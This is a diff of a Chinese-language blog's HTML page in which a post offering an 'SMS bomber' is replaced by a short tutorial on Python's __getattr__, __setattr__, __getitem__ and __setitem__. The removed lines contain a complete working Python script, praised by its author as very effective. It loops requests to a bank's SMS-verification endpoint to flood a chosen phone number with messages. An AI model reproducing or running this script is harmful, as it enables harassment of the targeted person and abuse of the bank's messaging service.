@@ -15,17 +15,17 @@
 
 
 
-<meta name="description" content="用Python写成的短信轰炸机，亲测非常有效，代码如下：">
+<meta name="description" content="使用一个例子来解释python之 getattr、getattr、getitem、setitem 使用：">
 <meta name="keywords" content="Python">
 <meta property="og:type" content="article">
-<meta property="og:title" content="短信轰炸机">
-<meta property="og:url" content="http://adamzeng.site/2017/11/04/短信轰炸机/index.html">
+<meta property="og:title" content="__getitem__ and __setitem__">
+<meta property="og:url" content="http://adamzeng.site/2017/11/09/getitem-and-setitem/index.html">
 <meta property="og:site_name" content="AdamZeng">
-<meta property="og:description" content="用Python写成的短信轰炸机，亲测非常有效，代码如下：">
-<meta property="og:updated_time" content="2017-11-04T13:11:07.000Z">
+<meta property="og:description" content="使用一个例子来解释python之 getattr、getattr、getitem、setitem 使用：">
+<meta property="og:updated_time" content="2017-11-09T09:08:48.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="短信轰炸机">
-<meta name="twitter:description" content="用Python写成的短信轰炸机，亲测非常有效，代码如下：">
+<meta name="twitter:title" content="__getitem__ and __setitem__">
+<meta name="twitter:description" content="使用一个例子来解释python之 getattr、getattr、getitem、setitem 使用：">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -57,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>短信轰炸机 | AdamZeng</title>
+<title>__getitem__ and __setitem__ | AdamZeng</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -280,11 +280,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-短信轰炸机" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-getitem-and-setitem" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/11/04/短信轰炸机/" class="article-date">
-      <time datetime="2017-11-04T13:07:59.000Z" itemprop="datePublished">2017-11-04</time>
+      <a href="/2017/11/09/getitem-and-setitem/" class="article-date">
+      <time datetime="2017-11-09T09:06:28.000Z" itemprop="datePublished">2017-11-09</time>
 </a>
 
 
@@ -299,7 +299,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      短信轰炸机
+      __getitem__ and __setitem__
     </h1>
   
 
@@ -324,8 +324,10 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>用Python写成的短信轰炸机，亲测非常有效，代码如下：<a id="more"></a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    print(<span class="string">"请输入手机号"</span>,end=<span class="string">":"</span>)</div><div class="line">    mobile=input()</div><div class="line">    <span class="keyword">if</span> len(mobile) != <span class="number">11</span>: <span class="comment">#判断输入长度</span></div><div class="line">        print(<span class="string">"手机号码长度错误！"</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(<span class="string">"请输入轰炸次数"</span>, end=<span class="string">":"</span>)</div><div class="line">        num = int(input())</div><div class="line">        print(<span class="string">"你要轰炸"</span>,num,<span class="string">"次"</span>,<span class="string">"马上开始!"</span>)</div><div class="line">        i = <span class="number">1</span></div><div class="line">        <span class="keyword">while</span> num &gt; <span class="number">0</span> :</div><div class="line">            payload = &#123;<span class="string">"AcNo"</span>:<span class="string">""</span>,<span class="string">"MobilePhone"</span>:<span class="string">""</span>,<span class="string">"BankId"</span>:<span class="string">"9999"</span>,<span class="string">"Transaction"</span>:<span class="string">"CreditOnlineApplyCert"</span>,<span class="string">"_locale"</span>:<span class="string">"zh_CN"</span>&#125; <span class="comment">#构造关键字的字典</span></div><div class="line">            payload[<span class="string">"MobilePhone"</span>]= mobile <span class="comment">#添加字典内容</span></div><div class="line">            url = <span class="string">"https://pbank.psbc.com/pweb/GetSmsForOutQuickPayment.do?"</span></div><div class="line">            r = requests.get(url,params=payload) <span class="comment">#开始get 并构造了url</span></div><div class="line">            print(<span class="string">"正在轰炸"</span>,mobile,<span class="string">"，轰炸第"</span>,i,<span class="string">"次"</span>)</div><div class="line">            num = num - <span class="number">1</span></div><div class="line">            i+=<span class="number">1</span></div><div class="line">            time.sleep(<span class="number">0</span>)<span class="comment"># 间隔时间</span></div><div class="line">        print(<span class="string">"轰炸完成！"</span>)</div></pre></td></tr></table></figure>
+        <p>使用一个例子来解释python之 <strong>getattr</strong>、<strong>getattr</strong>、<strong>getitem</strong>、<strong>setitem</strong> 使用：<a id="more"></a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">__getattr__内置使用点号获取实例属性属性如 s.name，自调用__getattr__</div><div class="line">__setattr__设置类实例属性 如s.name=<span class="string">'tom'</span>，自调用__setattr__</div><div class="line">__getitem__ 使用[]获取实例属性 如s[<span class="string">'name'</span>]，自调用__getitem__</div><div class="line">__setitem__ 使用[]设置实例属性如 s[<span class="string">'name'</span>] = <span class="string">'tom'</span> ，自调用__setitem__</div><div class="line">__dict__ 为参数字典</div></pre></td></tr></table></figure>
+<p>如下代码:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, item)</span>:</span></div><div class="line">        <span class="keyword">return</span> item + <span class="string">' is not exits'</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span><span class="params">(self, key, value)</span>:</span></div><div class="line">        self.__dict__[key] = value</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getitem__</span><span class="params">(self, item)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.__dict__[item]</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setitem__</span><span class="params">(self, key, value)</span>:</span></div><div class="line">        self.__dict__[key] = value</div><div class="line"></div><div class="line"></div><div class="line">s = Student()</div><div class="line">print(s.name)  <span class="comment"># 调用__getattr__方法 输出'name is not exits'</span></div><div class="line">s.age = <span class="number">1</span>  <span class="comment"># 调用__setattr__ 方法</span></div><div class="line">print(s.age)  <span class="comment"># 输出 1</span></div><div class="line">print(s[<span class="string">'age'</span>])  <span class="comment"># 调用 __getitem__方法 输出1</span></div><div class="line">s[<span class="string">'name'</span>] = <span class="string">'tom'</span>  <span class="comment"># 调用 __setitem__ 方法</span></div><div class="line">print(s[<span class="string">'name'</span>])  <span class="comment"># 调用 __getitem__ 方法 输出 'tom'</span></div></pre></td></tr></table></figure>
 
       
     </div>
@@ -334,13 +336,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/11/04/短信轰炸机/">短信轰炸机</a></p>
+        <p><span>本文标题:</span><a href="/2017/11/09/getitem-and-setitem/">__getitem__ and __setitem__</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">AdamZeng</a></p>
-        <p><span>发布时间:</span>2017-11-04, 21:07:59</p>
-        <p><span>最后更新:</span>2017-11-04, 21:11:07</p>
+        <p><span>发布时间:</span>2017-11-09, 17:06:28</p>
+        <p><span>最后更新:</span>2017-11-09, 17:08:48</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/11/04/短信轰炸机/" title="短信轰炸机">http://adamzeng.site/2017/11/04/短信轰炸机/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://adamzeng.site/2017/11/04/短信轰炸机/　　作者: AdamZeng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/11/09/getitem-and-setitem/" title="__getitem__ and __setitem__">http://adamzeng.site/2017/11/09/getitem-and-setitem/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://adamzeng.site/2017/11/09/getitem-and-setitem/　　作者: AdamZeng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -352,16 +354,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/11/05/探索迷宫/">
-                    探索迷宫
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/11/03/leetcode190/">
-                    leetcode190题131题191题231题342题
+                <a href="/2017/11/07/排序和搜索/">
+                    排序和搜索
                 </a>
             </div>
         
@@ -409,7 +405,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"短信轰炸机　| AdamZeng　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"__getitem__ and __setitem__　| AdamZeng　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -445,15 +441,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/11/05/探索迷宫/" title="上一篇: 探索迷宫">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/11/03/leetcode190/" title="下一篇: leetcode190题131题191题231题342题">
+            <a href="/2017/11/07/排序和搜索/" title="下一篇: 排序和搜索">
                 <i class="fa fa-angle-right"></i>
             </a>
         
